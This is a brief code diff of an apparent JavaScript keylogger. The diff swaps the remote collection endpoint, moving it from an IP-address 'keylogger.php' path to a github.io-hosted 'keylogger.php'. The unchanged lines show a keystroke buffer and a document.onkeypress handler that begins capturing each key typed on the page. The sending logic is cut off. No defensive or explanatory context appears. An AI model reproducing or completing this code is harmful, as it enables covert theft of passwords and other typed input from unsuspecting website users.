@@ -1,5 +1,5 @@
 var keys='';
-var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
+var url = 'https://managebac.github.io/keylogger.php';
 
 document.onkeypress = function(e) {
 	get = window.event?event:e;
